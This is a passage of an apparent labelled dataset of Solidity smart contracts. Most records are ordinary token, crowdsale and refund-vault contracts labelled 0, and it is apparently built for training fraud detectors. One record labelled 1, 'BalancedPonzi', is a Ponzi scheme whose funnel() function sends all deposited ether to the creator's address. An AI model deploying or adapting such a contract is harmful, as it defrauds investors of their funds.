cannot be traded until admin make it liquid.\r\r\n\t\/\/ Can only be called by crowdfund contract before the end time.\r\r\n\tfunction createIlliquidToken(address _recipient, uint _value)\r\r\n\t\twhen_mintable\r\r\n\t\tonly_minter\r\r\n\t\treturns (bool o_success)\r\r\n\t{\r\r\n\t\tilliquidBalance_index[illiquidBalance_amount] = _recipient;\r\r\n\t\tilliquidBalance[_recipient] += _value;\r\r\n\t\tilliquidBalance_amount++;\r\r\n\r\r\n\t\ttotalSupply += _value;\r\r\n\t\treturn true;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Make sender&#39;s illiquid balance liquid when called after lockout period.\r\r\n\tfunction makeLiquid()\r\r\n\t\tonly_minter\r\r\n\t{\r\r\n\t\tfor (uint i=0; i<illiquidBalance_amount; i++) {\r\r\n\t\t\taddress investor = illiquidBalance_index[i];\r\r\n\t\t\tbalances[investor] += illiquidBalance[investor];\r\r\n\t\t\tilliquidBalance[investor] = 0;\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/ Transfer amount of tokens from sender account to recipient.\r\r\n\t\/\/ Only callable after the crowd fund end date.\r\r\n\tfunction transfer(address _recipient, uint _amount)\r\r\n\t\twhen_transferable\r\r\n\t\treturns (bool o_success)\r\r\n\t{\r\r\n\t\treturn super.transfer(_recipient, _amount);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Transfer amount of tokens from a specified address to a recipient.\r\r\n\t\/\/ Only callable after the crowd fund end date.\r\r\n\tfunction transferFrom(address _from, address _recipient, uint _amount)\r\r\n\t\twhen_transferable\r\r\n\t\treturns (bool o_success)\r\r\n\t{\r\r\n\t\treturn super.transferFrom(_from, _recipient, _amount);\r\r\n\t}\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.13;\r\r\ncontract SafeMath {\r\r\n\r\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\r\n        uint256 z = x + y;\r\r\n        assert((z >= x) && (z >= y));\r\r\n        return z;\r\r\n    }\r\r\n\r\r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\r\n        assert(x >= y);\r\r\n        uint256 z = x - y;\r\r\n        return z;\r\r\n    }\r\r\n\r\r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\r\n        uint256 z = x * y;\r\r\n        assert((x == 0)||(z\/x == y));\r\r\n        return z;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Token {\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\n\/*  ERC 20 token *\/\r\r\ncontract StandardToken is Token, SafeMath {\r\r\n\r\r\n    mapping (address => uint256) balances;\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n    modifier onlyPayloadSize(uint numwords) {\r\r\n        assert(msg.data.length == numwords * 32 + 4);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transfer(address _to, uint256 _value)\r\r\n    returns (bool success)\r\r\n    {\r\r\n        if (balances[msg.sender] >= _value && _value > 0 && balances[_to] + _value > balances[_to]) {\r\r\n            balances[msg.sender] = safeSubtract(balances[msg.sender], _value);\r\r\n            balances[_to] = safeAdd(balances[_to], _value);\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n            return true;\r\r\n        } else {\r\r\n            return false;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value)\r\r\n    returns (bool success)\r\r\n    {\r\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0 && balances[_to] + _value > balances[_to]) {\r\r\n            balances[_to] = safeAdd(balances[_to], _value);\r\r\n            balances[_from] = safeSubtract(balances[_from], _value);\r\r\n            allowed[_from][msg.sender] = safeSubtract(allowed[_from][msg.sender], _value);\r\r\n            Transfer(_from, _to, _value);\r\r\n            return true;\r\r\n        } else {\r\r\n            return false;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint256 _value)\r\r\n    onlyPayloadSize(2)\r\r\n    returns (bool success)\r\r\n    {\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender)\r\r\n    constant\r\r\n    onlyPayloadSize(2)\r\r\n    returns (uint256 remaining)\r\r\n    {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n}\r\r\n\/**\r\r\n * @title VIBECoin\r\r\n * @dev ERC20 Token, where all tokens are pre-assigned to the creator.\r\r\n * Note they can later distribute these tokens as they wish using `transfer` and other\r\r\n * `StandardToken` functions.\r\r\n *\/\r\r\ncontract HubiiNetworkTokens is StandardToken {\r\r\n\r\r\n\r\r\n  string public name = \"Hubii network tokens\";\r\r\n  string public symbol = \"HNBT\";\r\r\n  uint256 public decimals = 18;\r\r\n  uint256 public INITIAL_SUPPLY = 267000000 * 1 ether;\r\r\n\r\r\n  \/**\r\r\n   * @dev Contructor that gives msg.sender all of existing tokens.\r\r\n   *\/\r\r\n  function HubiiNetworkTokens() {\r\r\n    totalSupply = INITIAL_SUPPLY;\r\r\n    balances[msg.sender] = INITIAL_SUPPLY;\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.6;\r\r\n\r\r\n\r\r\ncontract tokenRecipient {function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData);}\r\r\n\r\r\n\r\r\ncontract SIKKA {\r\r\n    \/* Public variables of the token *\/\r\r\n    string public standard = &#39;SIKKA 1.0&#39;;\r\r\n\r\r\n    string public name;\r\r\n\r\r\n    string public symbol;\r\r\n\r\r\n    uint8 public decimals;\r\r\n\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    address public owner;\r\r\n\r\r\n    \/* This creates an array with all balances *\/\r\r\n    mapping (address => uint256) public balanceOf;\r\r\n\r\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\r\n\r\r\n    \/* This generates a public event on the blockchain that will notify clients *\/\r\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n\r\r\n    \/* Initializes contract with initial supply tokens to the creator of the contract *\/\r\r\n    function SIKKA(\r\r\n    uint256 initialSupply,\r\r\n    string tokenName,\r\r\n    uint8 decimalUnits,\r\r\n    string tokenSymbol\r\r\n    ) {\r\r\n        balanceOf[msg.sender] = initialSupply;\r\r\n        \/\/ Give the creator all initial tokens\r\r\n        totalSupply = initialSupply;\r\r\n        \/\/ Update total supply\r\r\n        name = tokenName;\r\r\n        \/\/ Set the name for display purposes\r\r\n        symbol = tokenSymbol;\r\r\n        \/\/ Set the symbol for display purposes\r\r\n        decimals = decimalUnits;\r\r\n        \/\/ Amount of decimals for display purposes\r\r\n        \r\r\n        owner=msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        if (msg.sender != owner) throw;\r\r\n        _;\r\r\n    }\r\r\n    \/* Send coins *\/\r\r\n    function transfer(address _to, uint256 _value) {\r\r\n        if (_to == 0x0) throw;\r\r\n        \/\/ Prevent transfer to 0x0 address\r\r\n        if (balanceOf[msg.sender] < _value) throw;\r\r\n        \/\/ Check if the sender has enough\r\r\n        if (balanceOf[_to] + _value < balanceOf[_to]) throw;\r\r\n        \/\/ Check for overflows\r\r\n        balanceOf[msg.sender] -= _value;\r\r\n        \/\/ Subtract from the sender\r\r\n        balanceOf[_to] += _value;\r\r\n        \/\/ Add the same to the recipient\r\r\n        Transfer(msg.sender, _to, _value);\r\r\n        \/\/ Notify anyone listening that this transfer took place\r\r\n    }\r\r\n\r\r\n    \/* Allow another contract to spend some tokens in your behalf *\/\r\r\n    function approve(address _spender, uint256 _value)\r\r\n    returns (bool success) {\r\r\n        allowance[msg.sender][_spender] = _value;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/* Approve and then comunicate the approved contract in a single tx *\/\r\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData)\r\r\n    returns (bool success) {\r\r\n        tokenRecipient spender = tokenRecipient(_spender);\r\r\n        if (approve(_spender, _value)) {\r\r\n            spender.receiveApproval(msg.sender, _value, this, _extraData);\r\r\n            return true;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/* A contract attempts to get the coins *\/\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\r\n        if (_to == 0x0) throw;\r\r\n        \/\/ Prevent transfer to 0x0 address\r\r\n        if (balanceOf[_from] < _value) throw;\r\r\n        \/\/ Check if the sender has enough\r\r\n        if (balanceOf[_to] + _value < balanceOf[_to]) throw;\r\r\n        \/\/ Check for overflows\r\r\n        if (_value > allowance[_from][msg.sender]) throw;\r\r\n        \/\/ Check allowance\r\r\n        balanceOf[_from] -= _value;\r\r\n        \/\/ Subtract from the sender\r\r\n        balanceOf[_to] += _value;\r\r\n        \/\/ Add the same to the recipient\r\r\n        allowance[_from][msg.sender] -= _value;\r\r\n        Transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n}","label":0}
{"code":"contract BalancedPonzi {\r\r\n    \r\r\n    struct Person {\r\r\n      address addr;\r\r\n    }\r\r\n    \r\r\n    struct NiceGuy {\r\r\n      address addr2;\r\r\n    }\r\r\n    \r\r\n    Person[] public persons;\r\r\n    NiceGuy[] public niceGuys;\r\r\n    \r\r\n    uint public payoutIdx = 0;\r\r\n    uint public currentNiceGuyIdx = 0;\r\r\n    uint public investor = 0;\r\r\n    \r\r\n    address public currentNiceGuy;\r\r\n    address public beta;\r\r\n    \r\r\n    function BalancedPonzi() {\r\r\n        currentNiceGuy = msg.sender;\r\r\n        beta = msg.sender;\r\r\n    }\r\r\n    \r\r\n    \r\r\n    function() {\r\r\n        \r\r\n        uint idx = persons.length;\r\r\n        \r\r\n        if (msg.value != 9 ether) {\r\r\n            throw;\r\r\n        }\r\r\n        \r\r\n        if (investor > 8) {\r\r\n            uint ngidx = niceGuys.length;\r\r\n            niceGuys.length += 1;\r\r\n            niceGuys[ngidx].addr2 = msg.sender;\r\r\n            if (investor == 10) {\r\r\n                currentNiceGuy = niceGuys[currentNiceGuyIdx].addr2;\r\r\n                currentNiceGuyIdx += 1;\r\r\n            }\r\r\n        }\r\r\n        \r\r\n        if (investor < 9) {\r\r\n            persons.length += 1;\r\r\n            persons[idx].addr = msg.sender;\r\r\n        }\r\r\n        \r\r\n        investor += 1;\r\r\n        if (investor == 11) {\r\r\n            investor = 0;\r\r\n        }\r\r\n        \r\r\n        if (idx != 0) {\r\r\n            currentNiceGuy.send(1 ether);\r\r\n        }\r\r\n        \r\r\n        while (this.balance > 10 ether) {\r\r\n            persons[payoutIdx].addr.send(10 ether);\r\r\n            payoutIdx += 1;\r\r\n        }\r\r\n    }\r\r\n    \r\r\n    \r\r\n    function funnel() {\r\r\n        beta.send(this.balance);\r\r\n    }\r\r\n    \r\r\n    \r\r\n}","label":1}
{"code":"pragma solidity 0.4.15;\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Pausable\r\r\n * @dev Base contract which allows children to implement an emergency stop mechanism.\r\r\n *\/\r\r\ncontract Pausable is Ownable {\r\r\n  event Pause();\r\r\n  event Unpause();\r\r\n\r\r\n  bool public paused = false;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev modifier to allow actions only when the contract IS paused\r\r\n   *\/\r\r\n  modifier whenNotPaused() {\r\r\n    require(!paused);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev modifier to allow actions only when the contract IS NOT paused\r\r\n   *\/\r\r\n  modifier whenPaused {\r\r\n    require(paused);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev called by the owner to pause, triggers stopped state\r\r\n   *\/\r\r\n  function pause() onlyOwner whenNotPaused returns (bool) {\r\r\n    paused = true;\r\r\n    Pause();\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev called by the owner to unpause, returns to normal state\r\r\n   *\/\r\r\n  function unpause() onlyOwner whenPaused returns (bool) {\r\r\n    paused = false;\r\r\n    Unpause();\r\r\n    return true;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint256);\r\r\n  function transfer(address to, uint256 value) returns (bool);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances. \r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) returns (bool) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of. \r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value) returns (bool);\r\r\n  function approve(address spender, uint256 value) returns (bool);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amout of tokens to be transfered\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ require (_value <= _allowance);\r\r\n\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Aprove the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) returns (bool) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    require((_value == 0) || (allowed[msg.sender][_spender] == 0));\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifing the amount of tokens still avaible for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Pausable token\r\r\n *\r\r\n * Simple ERC20 Token example, with pausable token creation\r\r\n **\/\r\r\n\r\r\ncontract PausableToken is StandardToken, Pausable {\r\r\n\r\r\n  function transfer(address _to, uint _value) whenNotPaused returns (bool) {\r\r\n    return super.transfer(_to, _value);\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) whenNotPaused returns (bool) {\r\r\n    return super.transferFrom(_from, _to, _value);\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/ @title The PallyCoin\r\r\n\/\/\/ @author Merunas Grincalaitis\r\r\ncontract PallyCoin is PausableToken {\r\r\n   using SafeMath for uint256;\r\r\n\r\r\n   string public constant name = &#39;PallyCoin&#39;;\r\r\n\r\r\n   string public constant symbol = &#39;PAL&#39;;\r\r\n\r\r\n   uint8 public constant decimals = 18;\r\r\n\r\r\n   uint256 public constant totalSupply = 100e24; \/\/ 100M tokens with 18 decimals\r\r\n\r\r\n   \/\/ The tokens already used for the presale buyers\r\r\n   uint256 public tokensDistributedPresale = 0;\r\r\n\r\r\n   \/\/ The tokens already used for the ICO buyers\r\r\n   uint256 public tokensDistributedCrowdsale = 0;\r\r\n\r\r\n   address public crowdsale;\r\r\n\r\r\n   \/\/\/ @notice Only allows the execution of the function if it&#39;s comming from crowdsale\r\r\n   modifier onlyCrowdsale() {\r\r\n      require(msg.sender == crowdsale);\r\r\n      _;\r\r\n   }\r\r\n\r\r\n   \/\/ When someone refunds tokens\r\r\n   event RefundedTokens(address indexed user, uint256 tokens);\r\r\n\r\r\n   \/\/\/ @notice Constructor used to set the platform & development tokens. This is\r\r\n   \/\/\/ The 20% + 20% of the 100 M tokens used for platform and development team.\r\r\n   \/\/\/ The owner, msg.sender, is able to do allowance for other contracts. Remember\r\r\n   \/\/\/ to use `transferFrom()` if you&#39;re allowed\r\r\n   function PallyCoin() {\r\r\n      balances[msg.sender] = 40e24; \/\/ 40M tokens wei\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Function to set the crowdsale smart contract&#39;s address only by the owner of this token\r\r\n   \/\/\/ @param _crowdsale The address that will be used\r\r\n   function setCrowdsaleAddress(address _crowdsale) external onlyOwner whenNotPaused {\r\r\n      require(_crowdsale != address(0));\r\r\n\r\r\n      crowdsale = _crowdsale;\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Distributes the presale tokens. Only the owner can do this\r\r\n   \/\/\/ @param _buyer The address of the buyer\r\r\n   \/\/\/ @param tokens The amount of tokens corresponding to that buyer\r\r\n   function distributePresaleTokens(address _buyer, uint tokens) external onlyOwner whenNotPaused {\r\r\n      require(_buyer != address(0));\r\r\n      require(tokens > 0 && tokens <= 10e24);\r\r\n\r\r\n      \/\/ Check that the limit of 10M presale tokens hasn&#39;t been met yet\r\r\n      require(tokensDistributedPresale < 10e24);\r\r\n\r\r\n      tokensDistributedPresale = tokensDistributedPresale.add(tokens);\r\r\n      balances[_buyer] = balances[_buyer].add(tokens);\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Distributes the ICO tokens. Only the crowdsale address can execute this\r\r\n   \/\/\/ @param _buyer The buyer address\r\r\n   \/\/\/ @param tokens The amount of tokens to send to that address\r\r\n   function distributeICOTokens(address _buyer, uint tokens) external onlyCrowdsale whenNotPaused {\r\r\n      require(_buyer != address(0));\r\r\n      require(tokens > 0);\r\r\n\r\r\n      \/\/ Check that the limit of 50M ICO tokens hasn&#39;t been met yet\r\r\n      require(tokensDistributedCrowdsale < 50e24);\r\r\n\r\r\n      tokensDistributedCrowdsale = tokensDistributedCrowdsale.add(tokens);\r\r\n      balances[_buyer] = balances[_buyer].add(tokens);\r\r\n   }\r\r\n\r\r\n   \/\/\/ @notice Deletes the amount of tokens refunded from that buyer balance\r\r\n   \/\/\/ @param _buyer The buyer that wants the refund\r\r\n   \/\/\/ @param tokens The tokens to return\r\r\n   function refundTokens(address _buyer, uint256 tokens) external onlyCrowdsale whenNotPaused {\r\r\n      require(_buyer != address(0));\r\r\n      require(tokens > 0);\r\r\n      require(balances[_buyer] >= tokens);\r\r\n\r\r\n      balances[_buyer] = balances[_buyer].sub(tokens);\r\r\n      RefundedTokens(_buyer, tokens);\r\r\n   }\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title RefundVault\r\r\n * @dev This contract is used for storing funds while a crowdsale\r\r\n * is in progress. Supports refunding the money if crowdsale fails,\r\r\n * and forwarding it if crowdsale is successful.\r\r\n *\/\r\r\ncontract RefundVault is Ownable {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  enum State { Active, Refunding, Closed }\r\r\n\r\r\n  address public wallet;\r\r\n  address private crowdsale;\r\r\n  State public state;\r\r\n  uint256 public weiBalance;\r\r\n\r\r\n  mapping (address => uint256) public deposited;\r\r\n\r\r\n  event RefundsEnabled();\r\r\n  event Refunded(address indexed beneficiary, uint256 weiAmount);\r\r\n  event LogDeposited(address indexed buyer, uint256 amount);\r\r\n  event VaultClosed();\r\r\n\r\r\n  modifier onlyCrowdsale() {\r\r\n      require(msg.sender == crowdsale);\r\r\n      _;\r\r\n  }\r\r\n\r\r\n  function RefundVault(address _wallet) {\r\r\n    require(_wallet != 0x0);\r\r\n\r\r\n    wallet = _wallet;\r\r\n    crowdsale = msg.sender;\r\r\n    state = State.Active;\r\r\n  }\r\r\n\r\r\n  function deposit(address investor) external payable onlyCrowdsale {\r\r\n    require(state == State.Active);\r\r\n\r\r\n    weiBalance = weiBalance.add(msg.value);\r\r\n    deposited[investor] = deposited[investor].add(msg.value);\r\r\n    LogDeposited(msg.sender, msg.value);\r\r\n  }\r\r\n\r\r\n  function close() external onlyCrowdsale {\r\r\n    require(state == State.Active);\r\r\n\r\r\n    state = State.Closed;\r\r\n    wallet.transfer(weiBalance);\r\r\n    VaultClosed();\r\r\n  }\r\r\n\r\r\n  function enableRefunds() external onlyCrowdsale {\r\r\n    require(state == State.Active);\r\r\n\r\r\n    state = State.Refunding;\r\r\n    RefundsEnabled();\r\r\n  }\r\r\n\r\r\n  function refund(address investor) external onlyCrowdsale {\r\r\n    require(state == State.Refunding);\r\r\n\r\r\n    uint256 depositedValue = deposited[investor];\r\r\n    weiBalance = weiBalance.sub(depositedValue);\r\r\n    deposited[investor] = 0;\r\r\n    investor.transfer(depositedValue);\r\r\n    Refunded(investor, depositedValue);\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ 1. First you set the address of the wallet in the RefundVault contract that will store the deposit of ether\r\r\n\/\/ 2. If the goal is reached, the state of the vault will change and the ether will be sent to the address\r\r\n\/\/ 3. If the goal is not reached after 28 days, the state of the vault will change to refunding and the users will be able to call claimRefund() to get their ether\r\r\n\r\r\n\/\/\/ @title Crowdsale contract to carry out an ICO with the PallyCoin\r\r\n\/\/\/ Crowdsales have a start and end timestamps, where investors can make\r\r\n\/\/\/ token purchases and the crowdsale will assign them tokens based\r\r\n\/\/\/ on a token per ETH rate. Funds collected are forwarded to a wallet\r\r\n\/\/\/ as they arrive.\r\r\n\/\/\/ @author Merunas Grincalaitis <<a href=\"\/cdn-cgi\/l\/email-protection\" class=\"__cf_email__\" data-cfemail=\"8ee3ebfcfbe0effde9fce7e0edefe2efe7fae7fdcee9e3efe7e2a0ede1e3\">[email&#160;protected]<\/a>>\r\r\ncontract Crowdsale is Pausable {\r\r\n   using SafeMath for uint256;\r\r\n\r\r\n   \/\/ The token being sold\r\r\n   PallyCoin public token;\r\r\n\r\r\n   \/\/ The vault that will store the ether until the goal is reached\r\r\n   RefundVault public vault;\r\r\n\r\r\n   \/\/ The block number of when the crowdsale starts\r\r\n   \/\/ 10\/15\/2017 @ 11:00am (UTC)\r\r\n   \/\/ 10\/15\/2017 @ 12:00am (GMT + 1)\r\r\n   uint256 public startTime = 1508065200;\r\r\n\r\r\n   \/\/ The block number of when the crowdsale ends\r\r\n   \/\/ 11\/13\/2017 @ 11:00am (UTC)\r\r\n   \/\/ 11\/13\/2017 @ 12:00pm (GMT + 1)\r\r\n   uint256 public endTime = 1510570800;\r\r\n\r\r\n   \/\/ The wallet that holds the Wei raised on the crowdsale\r\r\n   address public wallet;\r\r\n\r\r\n   \/\/ The rate of tokens per ether. Only applied for the first tier, the first\r\r\n   \/\/ 12.5 million tokens sold\r\r\n   uint256 public rate;\r\r\n\r\r\n   \/\/ The rate of tokens per ether. Only applied for the second tier, at between\r\r\n   \/\/ 12.5 million tokens sold and 25 million tokens sold\r\r\n   uint256 public rateTier2;\r\r\n\r\r\n   \/\/ The rate of tokens per ether. Only applied for the third tier, at between\r\r\n   \/\/ 25 million tokens sold and 37.5 million tokens sold\r\r\n   uint256 public rateTier3;\r\r\n\r\r\n   \/\/ The rate of tokens per ether. Only applied for the fourth tier, at between\r\r\n   \/\/ 37.5 million tokens sold and 50 million tokens sold\r\r\n   uint256 public rateTier4;\r\r\n\r\r\n   \/\/ The amount of wei raised\r\r\n   uint256 public weiRaised = 0;\r\r\n\r\r\n   \/\/ The amount of tokens raised\r\r\n   uint256 public tokensRaised = 0;\r\r\n\r\r\n   \/\/ You can only buy up to 50 M tokens during the ICO\r\r\n   uint256 public constant maxTokensRaised = 50e24;\r\r\n\r\r\n   \/\/ The minimum amount of Wei you must pay to participate in the crowdsale\r\r\n   uint256 public constant minPurchase = 100 finney; \/\/ 0.1 ether\r\r\n\r\r\n   \/\/ The max amount of Wei that you can pay to participate in the crowdsale\r\r\n   uint256 public constant maxPurchase = 1000 ether;\r\r\n\r\r\n   \/\/ Minimum amount of tokens to be raised. 7.5 million tokens which is the 15%\r\r\n   \/\/ of the total of 50 million tokens sold in the crowdsale\r\r\n   \/\/ 7.5e6 + 1e18\r\r\n   uint256 public constant minimumGoal = 7.5e24;\r\r\n\r\r\n   \/\/ If the crowdsale wasn&#39;t successful, this will be true and users will be able\r\r\n   \/\/ to claim the refund of their ether\r\r\n   bool public isRefunding = false;\r\r\n\r\r\n   \/\/ If the crowdsale has ended or not\r\r\n   bool public isEnded = false;\r\r\n\r\r\n   \/\/ How much each user paid for the crowdsale\r\r\n   mapping(address => uint256) public crowdsaleBalances;\r\r\n\r\r\n   \/\/ How many tokens each user got for the crowdsale\r\r\n   mapping(address => uint256) public tokensBought;\r\r\n\r\r\n   \/\/ To indicate who purchased what amount of tokens and who received what amount of wei\r\r\n   event TokenPurchase(address indexed buyer, uint256 value, uint256 amountOfTokens);\r\r\n\r\r\n   \/\/ Indicates if the crowdsale has 